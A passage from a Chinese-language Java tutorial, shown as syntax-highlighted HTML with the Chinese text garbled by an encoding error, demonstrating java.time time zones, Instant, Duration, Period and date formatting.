        System.out.println(<span class="hljs-string">"\n6. æ—¶åŒºåç§»è®¡ç®—:"</span>);
        <span class="hljs-type">ZoneId</span> <span class="hljs-variable">tokyoZone</span> <span class="hljs-operator">=</span> ZoneId.of(<span class="hljs-string">"Asia/Tokyo"</span>);
        <span class="hljs-type">ZoneId</span> <span class="hljs-variable">newYorkZone</span> <span class="hljs-operator">=</span> ZoneId.of(<span class="hljs-string">"America/New_York"</span>);
        
        <span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> Instant.now();
        <span class="hljs-type">ZoneOffset</span> <span class="hljs-variable">tokyoOffset</span> <span class="hljs-operator">=</span> tokyoZone.getRules().getOffset(instant);
        <span class="hljs-type">ZoneOffset</span> <span class="hljs-variable">newYorkOffset</span> <span class="hljs-operator">=</span> newYorkZone.getRules().getOffset(instant);
        
        System.out.println(<span class="hljs-string">"ä¸œäº¬æ—¶åŒºåç§»: "</span> + tokyoOffset);
        System.out.println(<span class="hljs-string">"çº½çº¦æ—¶åŒºåç§»: "</span> + newYorkOffset);
        System.out.println(<span class="hljs-string">"æ—¶å·®: "</span> + 
            Duration.between(
                instant.atOffset(tokyoOffset).toLocalTime(),
                instant.atOffset(newYorkOffset).toLocalTime()
            ).toHours() + <span class="hljs-string">" å°æ—¶"</span>
        );
        
        <span class="hljs-comment">// 7. å®é™…åº”ç”¨ï¼šå…¨çƒä¼šè®®æ—¶é—´</span>
        System.out.println(<span class="hljs-string">"\n7. å®é™…åº”ç”¨ï¼šå…¨çƒä¼šè®®æ—¶é—´å®‰æ’:"</span>);
        scheduleGlobalMeeting();
    }
    
    <span class="hljs-comment">// æµ‹è¯•å¤ä»¤æ—¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDaylightSavingTime</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ZoneId</span> <span class="hljs-variable">nyZone</span> <span class="hljs-operator">=</span> ZoneId.of(<span class="hljs-string">"America/New_York"</span>);
        
        <span class="hljs-comment">// çº½çº¦2023å¹´å¤ä»¤æ—¶å¼€å§‹äº3æœˆ12æ—¥</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">beforeDST</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span>);
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">afterDST</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>);
        
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedBefore</span> <span class="hljs-operator">=</span> ZonedDateTime.of(beforeDST, nyZone);
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedAfter</span> <span class="hljs-operator">=</span> ZonedDateTime.of(afterDST, nyZone);
        
        System.out.println(<span class="hljs-string">"å¤ä»¤æ—¶å˜åŒ–å‰: "</span> + zonedBefore);
        System.out.println(<span class="hljs-string">"å¤ä»¤æ—¶å˜åŒ–å: "</span> + zonedAfter);
        System.out.println(<span class="hljs-string">"æ˜¯å¦åœ¨å¤ä»¤æ—¶ä¸­: "</span> + zonedAfter.getZone().getRules().isDaylightSavings(zonedAfter.toInstant()));
        
        <span class="hljs-comment">// æ£€æŸ¥è½¬æ¢</span>
        System.out.println(<span class="hljs-string">"\néªŒè¯è½¬æ¢:"</span>);
        System.out.println(<span class="hljs-string">"è½¬æ¢åˆ°ä¼¦æ•¦æ—¶é—´:"</span>);
        System.out.println(<span class="hljs-string">"  å‰: "</span> + zonedBefore.withZoneSameInstant(ZoneId.of(<span class="hljs-string">"Europe/London"</span>)));
        System.out.println(<span class="hljs-string">"  å: "</span> + zonedAfter.withZoneSameInstant(ZoneId.of(<span class="hljs-string">"Europe/London"</span>)));
    }
    
    <span class="hljs-comment">// å®‰æ’å…¨çƒä¼šè®®</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleGlobalMeeting</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"=== å…¨çƒä¼šè®®å®‰æ’ ==="</span>);
        
        <span class="hljs-comment">// å‡è®¾ä¼šè®®åœ¨æ—§é‡‘å±±æ—¶é—´ä¸Šåˆ9ç‚¹</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">meetingTime</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>);
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">meetingSF</span> <span class="hljs-operator">=</span> ZonedDateTime.of(meetingTime, ZoneId.of(<span class="hljs-string">"America/Los_Angeles"</span>));
        
        System.out.println(<span class="hljs-string">"ä¼šè®®æ—¶é—´ï¼ˆæ—§é‡‘å±±ï¼‰: "</span> + meetingSF);
        
        <span class="hljs-comment">// è½¬æ¢åˆ°å…¶ä»–åŸå¸‚</span>
        String[] cities = {
            <span class="hljs-string">"Asia/Shanghai"</span>,      <span class="hljs-comment">// ä¸Šæµ·</span>
            <span class="hljs-string">"Asia/Tokyo"</span>,         <span class="hljs-comment">// ä¸œäº¬</span>
            <span class="hljs-string">"Europe/London"</span>,      <span class="hljs-comment">// ä¼¦æ•¦</span>
            <span class="hljs-string">"Europe/Paris"</span>,       <span class="hljs-comment">// å·´é»</span>
            <span class="hljs-string">"America/New_York"</span>,   <span class="hljs-comment">// çº½çº¦</span>
            <span class="hljs-string">"Australia/Sydney"</span>    <span class="hljs-comment">// æ‚‰å°¼</span>
        };
        
        System.out.println(<span class="hljs-string">"\nå„åŸå¸‚ä¼šè®®æ—¶é—´:"</span>);
        <span class="hljs-keyword">for</span> (String city : cities) {
            <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">cityTime</span> <span class="hljs-operator">=</span> meetingSF.withZoneSameInstant(ZoneId.of(city));
            System.out.printf(<span class="hljs-string">"%-20s: %s%n"</span>, 
                city.split(<span class="hljs-string">"/"</span>)[<span class="hljs-number">1</span>], 
                cityTime.format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm (zzz)"</span>))
            );
        }
    }
    
    <span class="hljs-comment">// è®¡ç®—é£è¡Œæ—¶é—´ï¼ˆè€ƒè™‘æ—¶åŒºï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Duration <span class="hljs-title function_">calculateFlightDuration</span><span class="hljs-params">(ZonedDateTime departure, ZonedDateTime arrival)</span> {
        <span class="hljs-keyword">return</span> Duration.between(departure, arrival);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨è¥ä¸šæ—¶é—´å†…ï¼ˆè€ƒè™‘æ—¶åŒºï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBusinessHourGlobal</span><span class="hljs-params">(ZonedDateTime time, ZoneId businessZone, 
                                              LocalTime open, LocalTime close)</span> {
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">businessZoneTime</span> <span class="hljs-operator">=</span> time.withZoneSameInstant(businessZone);
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">localTime</span> <span class="hljs-operator">=</span> businessZoneTime.toLocalTime();
        
        <span class="hljs-keyword">return</span> !localTime.isBefore(open) &amp;&amp; !localTime.isAfter(close);
    }
}
</code></pre>
<h2 data-id="heading-13">Instantå’ŒDurationï¼šæ—¶é—´ç‚¹ä¸æ—¶é—´æ®µ</h2>
<h3 data-id="heading-14">Instantå’ŒDurationå®æˆ˜</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstantDurationExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"=== Instant å’Œ Duration å®æˆ˜ ==="</span>);
        
        <span class="hljs-comment">// 1. Instantï¼šæ—¶é—´ç‚¹ï¼ˆæ—¶é—´æˆ³ï¼‰</span>
        System.out.println(<span class="hljs-string">"\n1. Instant - æ—¶é—´ç‚¹:"</span>);
        
        <span class="hljs-type">Instant</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> Instant.now();
        <span class="hljs-type">Instant</span> <span class="hljs-variable">specificInstant</span> <span class="hljs-operator">=</span> Instant.ofEpochMilli(<span class="hljs-number">1699999999999L</span>);
        <span class="hljs-type">Instant</span> <span class="hljs-variable">parsedInstant</span> <span class="hljs-operator">=</span> Instant.parse(<span class="hljs-string">"2023-11-15T14:30:45.123Z"</span>);
        
        System.out.println(<span class="hljs-string">"å½“å‰æ—¶åˆ»: "</span> + now);
        System.out.println(<span class="hljs-string">"æŒ‡å®šæ—¶é—´æˆ³: "</span> + specificInstant);
        System.out.println(<span class="hljs-string">"è§£æçš„ISOæ ¼å¼: "</span> + parsedInstant);
        
        <span class="hljs-comment">// è·å–æ—¶é—´æˆ³</span>
        System.out.println(<span class="hljs-string">"\næ—¶é—´æˆ³è·å–:"</span>);
        System.out.println(<span class="hljs-string">"æ¯«ç§’æ—¶é—´æˆ³: "</span> + now.toEpochMilli());
        System.out.println(<span class="hljs-string">"ç§’æ—¶é—´æˆ³: "</span> + now.getEpochSecond());
        System.out.println(<span class="hljs-string">"çº³ç§’éƒ¨åˆ†: "</span> + now.getNano());
        
        <span class="hljs-comment">// 2. Instantè¿ç®—</span>
        System.out.println(<span class="hljs-string">"\n2. Instantè¿ç®—:"</span>);
        System.out.println(<span class="hljs-string">"1å°æ—¶å: "</span> + now.plus(<span class="hljs-number">1</span>, ChronoUnit.HOURS));
        System.out.println(<span class="hljs-string">"30åˆ†é’Ÿå: "</span> + now.plus(<span class="hljs-number">30</span>, ChronoUnit.MINUTES));
        System.out.println(<span class="hljs-string">"1å¤©å‰: "</span> + now.minus(<span class="hljs-number">1</span>, ChronoUnit.DAYS));
        System.out.println(<span class="hljs-string">"500æ¯«ç§’å‰: "</span> + now.minus(<span class="hljs-number">500</span>, ChronoUnit.MILLIS));
        
        <span class="hljs-comment">// 3. Durationï¼šæ—¶é—´æ®µï¼ˆåŸºäºæ—¶é—´ï¼‰</span>
        System.out.println(<span class="hljs-string">"\n3. Duration - æ—¶é—´æ®µ:"</span>);
        
        <span class="hljs-type">Duration</span> <span class="hljs-variable">oneHour</span> <span class="hljs-operator">=</span> Duration.ofHours(<span class="hljs-number">1</span>);
        <span class="hljs-type">Duration</span> <span class="hljs-variable">thirtyMinutes</span> <span class="hljs-operator">=</span> Duration.ofMinutes(<span class="hljs-number">30</span>);
        <span class="hljs-type">Duration</span> <span class="hljs-variable">customDuration</span> <span class="hljs-operator">=</span> Duration.of(<span class="hljs-number">90</span>, ChronoUnit.SECONDS);
        <span class="hljs-type">Duration</span> <span class="hljs-variable">parsedDuration</span> <span class="hljs-operator">=</span> Duration.parse(<span class="hljs-string">"PT1H30M"</span>); <span class="hljs-comment">// ISO-8601æ ¼å¼</span>
        
        System.out.println(<span class="hljs-string">"1å°æ—¶: "</span> + oneHour);
        System.out.println(<span class="hljs-string">"30åˆ†é’Ÿ: "</span> + thirtyMinutes);
        System.out.println(<span class="hljs-string">"90ç§’: "</span> + customDuration);
        System.out.println(<span class="hljs-string">"è§£æ1å°æ—¶30åˆ†é’Ÿ: "</span> + parsedDuration);
        
        <span class="hljs-comment">// 4. Durationè¿ç®—</span>
        System.out.println(<span class="hljs-string">"\n4. Durationè¿ç®—:"</span>);
        System.out.println(<span class="hljs-string">"1å°æ—¶ + 30åˆ†é’Ÿ = "</span> + oneHour.plus(thirtyMinutes));
        System.out.println(<span class="hljs-string">"2å°æ—¶ - 30åˆ†é’Ÿ = "</span> + Duration.ofHours(<span class="hljs-number">2</span>).minus(thirtyMinutes));
        System.out.println(<span class="hljs-string">"30åˆ†é’Ÿ Ã— 2 = "</span> + thirtyMinutes.multipliedBy(<span class="hljs-number">2</span>));
        System.out.println(<span class="hljs-string">"1å°æ—¶ Ã· 2 = "</span> + oneHour.dividedBy(<span class="hljs-number">2</span>));
        
        <span class="hljs-comment">// 5. è·å–Durationå„éƒ¨åˆ†</span>
        System.out.println(<span class="hljs-string">"\n5. Durationåˆ†è§£:"</span>);
        <span class="hljs-type">Duration</span> <span class="hljs-variable">complexDuration</span> <span class="hljs-operator">=</span> Duration.ofHours(<span class="hljs-number">25</span>).plusMinutes(<span class="hljs-number">90</span>);
        System.out.println(<span class="hljs-string">"25å°æ—¶90åˆ†é’Ÿåˆ†è§£:"</span>);
        System.out.println(<span class="hljs-string">"  æ€»å¤©æ•°: "</span> + complexDuration.toDays());
        System.out.println(<span class="hljs-string">"  æ€»å°æ—¶æ•°: "</span> + complexDuration.toHours());
        System.out.println(<span class="hljs-string">"  æ€»åˆ†é’Ÿæ•°: "</span> + complexDuration.toMinutes());
        System.out.println(<span class="hljs-string">"  æ€»ç§’æ•°: "</span> + complexDuration.toSeconds());
        System.out.println(<span class="hljs-string">"  æ€»æ¯«ç§’æ•°: "</span> + complexDuration.toMillis());
        System.out.println(<span class="hljs-string">"  æ€»çº³ç§’æ•°: "</span> + complexDuration.toNanos());
        
        System.out.println(<span class="hljs-string">"\nå„éƒ¨åˆ†:"</span>);
        System.out.println(<span class="hljs-string">"  å°æ—¶éƒ¨åˆ†: "</span> + complexDuration.toHoursPart());
        System.out.println(<span class="hljs-string">"  åˆ†é’Ÿéƒ¨åˆ†: "</span> + complexDuration.toMinutesPart());
        System.out.println(<span class="hljs-string">"  ç§’éƒ¨åˆ†: "</span> + complexDuration.toSecondsPart());
        
        <span class="hljs-comment">// 6. Periodï¼šæ—¶é—´æ®µï¼ˆåŸºäºæ—¥æœŸï¼‰</span>
        System.out.println(<span class="hljs-string">"\n6. Period - åŸºäºæ—¥æœŸçš„æ—¶é—´æ®µ:"</span>);
        
        <span class="hljs-type">Period</span> <span class="hljs-variable">oneYear</span> <span class="hljs-operator">=</span> Period.ofYears(<span class="hljs-number">1</span>);
        <span class="hljs-type">Period</span> <span class="hljs-variable">sixMonths</span> <span class="hljs-operator">=</span> Period.ofMonths(<span class="hljs-number">6</span>);
        <span class="hljs-type">Period</span> <span class="hljs-variable">complexPeriod</span> <span class="hljs-operator">=</span> Period.of(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>); <span class="hljs-comment">// 1å¹´6ä¸ªæœˆ15å¤©</span>
        <span class="hljs-type">Period</span> <span class="hljs-variable">parsedPeriod</span> <span class="hljs-operator">=</span> Period.parse(<span class="hljs-string">"P1Y6M15D"</span>); <span class="hljs-comment">// ISO-8601æ ¼å¼</span>
        
        System.out.println(<span class="hljs-string">"1å¹´: "</span> + oneYear);
        System.out.println(<span class="hljs-string">"6ä¸ªæœˆ: "</span> + sixMonths);
        System.out.println(<span class="hljs-string">"1å¹´6ä¸ªæœˆ15å¤©: "</span> + complexPeriod);
        System.out.println(<span class="hljs-string">"è§£æçš„Period: "</span> + parsedPeriod);
        
        <span class="hljs-comment">// 7. å®é™…åº”ç”¨ï¼šè®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„æ—¶é—´æ®µ</span>
        System.out.println(<span class="hljs-string">"\n7. å®é™…åº”ç”¨ï¼šè®¡ç®—æ—¶é—´æ®µ:"</span>);
        
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">birthDate</span> <span class="hljs-operator">=</span> LocalDate.of(<span class="hljs-number">1990</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();
        
        <span class="hljs-type">Period</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> Period.between(birthDate, today);
        System.out.println(<span class="hljs-string">"å¹´é¾„: "</span> + age.getYears() + <span class="hljs-string">"å¹´ "</span> + 
                         age.getMonths() + <span class="hljs-string">"ä¸ªæœˆ "</span> + 
                         age.getDays() + <span class="hljs-string">"å¤©"</span>);
        
        <span class="hljs-comment">// 8. å®é™…åº”ç”¨ï¼šæ€§èƒ½æµ‹é‡</span>
        System.out.println(<span class="hljs-string">"\n8. æ€§èƒ½æµ‹é‡ç¤ºä¾‹:"</span>);
        measurePerformance();
        
        <span class="hljs-comment">// 9. å®é™…åº”ç”¨ï¼šè¶…æ—¶æ§åˆ¶</span>
        System.out.println(<span class="hljs-string">"\n9. è¶…æ—¶æ§åˆ¶ç¤ºä¾‹:"</span>);
        timeoutControl();
    }
    
    <span class="hljs-comment">// æ€§èƒ½æµ‹é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">measurePerformance</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Instant</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Instant.now();
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
        <span class="hljs-keyword">try</span> {
            TimeUnit.MILLISECONDS.sleep(<span class="hljs-number">1500</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-type">Instant</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> Instant.now();
        <span class="hljs-type">Duration</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> Duration.between(start, end);
        
        System.out.println(<span class="hljs-string">"æ“ä½œè€—æ—¶: "</span> + elapsed.toMillis() + <span class="hljs-string">" æ¯«ç§’"</span>);
        System.out.println(<span class="hljs-string">"æ“ä½œè€—æ—¶: "</span> + elapsed.getSeconds() + <span class="hljs-string">" ç§’ "</span> + 
                         elapsed.toMillisPart() + <span class="hljs-string">" æ¯«ç§’"</span>);
        
        <span class="hljs-comment">// æ ¼å¼åŒ–è¾“å‡º</span>
        <span class="hljs-keyword">if</span> (elapsed.toMinutes() &gt; <span class="hljs-number">0</span>) {
            System.out.printf(<span class="hljs-string">"æ ¼å¼åŒ–: %dåˆ† %dç§’ %dæ¯«ç§’%n"</span>,
                elapsed.toMinutes(),
                elapsed.toSecondsPart(),
                elapsed.toMillisPart());
        } <span class="hljs-keyword">else</span> {
            System.out.printf(<span class="hljs-string">"æ ¼å¼åŒ–: %dç§’ %dæ¯«ç§’%n"</span>,
                elapsed.toSeconds(),
                elapsed.toMillisPart());
        }
    }
    
    <span class="hljs-comment">// è¶…æ—¶æ§åˆ¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">timeoutControl</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Duration</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> Duration.ofSeconds(<span class="hljs-number">3</span>);
        <span class="hljs-type">Instant</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> Instant.now();
        
        System.out.println(<span class="hljs-string">"å¼€å§‹æ‰§è¡Œï¼Œè¶…æ—¶æ—¶é—´: "</span> + timeout.getSeconds() + <span class="hljs-string">"ç§’"</span>);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ¨¡æ‹Ÿé•¿æ—¶é—´æ“ä½œ</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++) {
                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¶…æ—¶</span>
                <span class="hljs-type">Duration</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> Duration.between(startTime, Instant.now());
                <span class="hljs-keyword">if</span> (elapsed.compareTo(timeout) &gt; <span class="hljs-number">0</span>) {
                    System.out.println(<span class="hljs-string">"æ“ä½œè¶…æ—¶ï¼"</span>);
                    <span class="hljs-keyword">break</span>;
                }
                
                System.out.println(<span class="hljs-string">"ç¬¬ "</span> + i + <span class="hljs-string">" æ­¥"</span>);
                TimeUnit.MILLISECONDS.sleep(<span class="hljs-number">500</span>);
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
        
        <span class="hljs-type">Duration</span> <span class="hljs-variable">totalTime</span> <span class="hljs-operator">=</span> Duration.between(startTime, Instant.now());
        System.out.println(<span class="hljs-string">"æ€»è€—æ—¶: "</span> + totalTime.toMillis() + <span class="hljs-string">"æ¯«ç§’"</span>);
    }
    
    <span class="hljs-comment">// è®¡ç®—ä¸¤ä¸ªæ—¶åˆ»ä¹‹é—´çš„ç²¾ç¡®æ—¶é—´æ®µ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">formatDurationBetween</span><span class="hljs-params">(Instant start, Instant end)</span> {
        <span class="hljs-type">Duration</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> Duration.between(start, end);
        
        <span class="hljs-type">long</span> <span class="hljs-variable">days</span> <span class="hljs-operator">=</span> duration.toDays();
        <span class="hljs-type">long</span> <span class="hljs-variable">hours</span> <span class="hljs-operator">=</span> duration.toHoursPart();
        <span class="hljs-type">long</span> <span class="hljs-variable">minutes</span> <span class="hljs-operator">=</span> duration.toMinutesPart();
        <span class="hljs-type">long</span> <span class="hljs-variable">seconds</span> <span class="hljs-operator">=</span> duration.toSecondsPart();
        <span class="hljs-type">long</span> <span class="hljs-variable">millis</span> <span class="hljs-operator">=</span> duration.toMillisPart();
        
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">if</span> (days &gt; <span class="hljs-number">0</span>) sb.append(days).append(<span class="hljs-string">"å¤© "</span>);
        <span class="hljs-keyword">if</span> (hours &gt; <span class="hljs-number">0</span> || days &gt; <span class="hljs-number">0</span>) sb.append(hours).append(<span class="hljs-string">"å°æ—¶ "</span>);
        <span class="hljs-keyword">if</span> (minutes &gt; <span class="hljs-number">0</span> || hours &gt; <span class="hljs-number">0</span> || days &gt; <span class="hljs-number">0</span>) sb.append(minutes).append(<span class="hljs-string">"åˆ† "</span>);
        sb.append(seconds).append(<span class="hljs-string">"ç§’ "</span>);
        sb.append(millis).append(<span class="hljs-string">"æ¯«ç§’"</span>);
        
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-comment">// è®¡ç®—å·¥ä½œæ—¥çš„æŒç»­æ—¶é—´</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Duration <span class="hljs-title function_">calculateWorkingDuration</span><span class="hljs-params">(LocalDateTime start, LocalDateTime end)</span> {
        <span class="hljs-type">Duration</span> <span class="hljs-variable">totalDuration</span> <span class="hljs-operator">=</span> Duration.between(start, end);
        
        <span class="hljs-comment">// è®¡ç®—åŒ…å«çš„å‘¨æœ«å¤©æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">weekendDays</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">currentDate</span> <span class="hljs-operator">=</span> start.toLocalDate();
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">endDate</span> <span class="hljs-operator">=</span> end.toLocalDate();
        
        <span class="hljs-keyword">while</span> (!currentDate.isAfter(endDate)) {
            <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">dayOfWeek</span> <span class="hljs-operator">=</span> currentDate.getDayOfWeek();
            <span class="hljs-keyword">if</span> (dayOfWeek == DayOfWeek.SATURDAY || dayOfWeek == DayOfWeek.SUNDAY) {
                weekendDays++;
            }
            currentDate = currentDate.plusDays(<span class="hljs-number">1</span>);
        }
        
        <span class="hljs-comment">// å‡å»å‘¨æœ«çš„æ—¶é—´</span>
        <span class="hljs-type">Duration</span> <span class="hljs-variable">weekendDuration</span> <span class="hljs-operator">=</span> Duration.ofDays(weekendDays);
        <span class="hljs-keyword">return</span> totalDuration.minus(weekendDuration);
    }
}
</code></pre>
<h2 data-id="heading-15">æ ¼å¼åŒ–ä¸è§£æ</h2>
<h3 data-id="heading-16">é«˜çº§æ ¼å¼åŒ–ä¸è§£æ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;
<span class="hljs-keyword">import</span> java.util.Locale;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatting</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== æ—¥æœŸæ—¶é—´æ ¼å¼åŒ–ä¸è§£æ ==="</span>);
        
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalDateTime.now();
        
        <span class="hljs-comment">// 1. é¢„å®šä¹‰çš„æ ¼å¼åŒ–å™¨</span>
        System.out.println(<span class="hljs-string">"\n1. é¢„å®šä¹‰çš„æ ¼å¼åŒ–å™¨:"</span>);
        
        System.out.println(<span class="hljs-string">"ISOæ ¼å¼: "</span> + now.format(DateTimeFormatter.ISO_LOCAL_DATE_TIME));
        System.out.println(<span class="hljs-string">"ISOæ—¥æœŸ: "</span> + now.format(DateTimeFormatter.ISO_LOCAL_DATE));
        System.out.println(<span class="hljs-string">"ISOæ—¶é—´: "</span> + now.format(DateTimeFormatter.ISO_LOCAL_TIME));
        
        <span class="hljs-comment">// 2. è‡ªå®šä¹‰æ¨¡å¼</span>
        System.out.println(<span class="hljs-string">"\n2. è‡ªå®šä¹‰æ¨¡å¼:"</span>);
        
        DateTimeFormatter[] formatters = {
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"dd/MM/yyyy"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyyå¹´MMæœˆddæ—¥"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss.SSS"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"EEEE, MMMM dd, yyyy"</span>), <span class="hljs-comment">// æ˜ŸæœŸï¼Œæœˆä»½ï¼Œæ—¥ï¼Œå¹´</span>
            DateTimeFormatter.ofPattern(<span class="hljs-string">"hh:mm a"</span>),            <span class="hljs-comment">// 12å°æ—¶åˆ¶</span>
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyyå¹´ ç¬¬Qå­£åº¦"</span>),       <span class="hljs-comment">// å­£åº¦</span>
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd'T'HH:mm:ssXXX"</span>) <span class="hljs-comment">// å¸¦æ—¶åŒºåç§»</span>
        };
        
        <span class="hljs-keyword">for</span> (DateTimeFormatter formatter : formatters) {
            System.out.println(formatter.format(now) + <span class="hljs-string">"  &lt;- "</span> + 
                             formatter.toString().replaceAll(<span class="hljs-string">".*\["</span>, <span class="hljs-string">"["</span>));
        }
        
        <span class="hljs-comment">// 3. æœ¬åœ°åŒ–æ ¼å¼åŒ–</span>
        System.out.println(<span class="hljs-string">"\n3. æœ¬åœ°åŒ–æ ¼å¼åŒ–:"</span>);
        
        Locale[] locales = {Locale.US, Locale.UK, Locale.GERMANY, Locale.JAPAN, Locale.CHINA};
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">localizedFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofLocalizedDateTime(FormatStyle.MEDIUM);
        
        <span class="hljs-keyword">for</span> (Locale locale : locales) {
            <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">localeSpecific</span> <span class="hljs-operator">=</span> localizedFormatter.withLocale(locale);
            System.out.println(locale.getDisplayName() + <span class="hljs-string">": "</span> + localeSpecific.format(now));
        }
        
        <span class="hljs-comment">// 4. æ ¼å¼åŒ–å™¨æ„å»ºå™¨ï¼ˆå¤æ‚æ ¼å¼åŒ–ï¼‰</span>
        System.out.println(<span class="hljs-string">"\n4. æ ¼å¼åŒ–å™¨æ„å»ºå™¨:"</span>);
        
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">complexFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTimeFormatterBuilder</span>()
            .appendLiteral(<span class="hljs-string">"æ—¥æœŸ: "</span>)
            .appendValue(ChronoField.YEAR, <span class="hljs-number">4</span>)
            .appendLiteral(<span class="hljs-string">"å¹´"</span>)
            .appendValue(ChronoField.MONTH_OF_YEAR, <span class="hljs-number">2</span>)
            .appendLiteral(<span class="hljs-string">"æœˆ"</span>)
            .appendValue(ChronoField.DAY_OF_MONTH, <span class="hljs-number">2</span>)
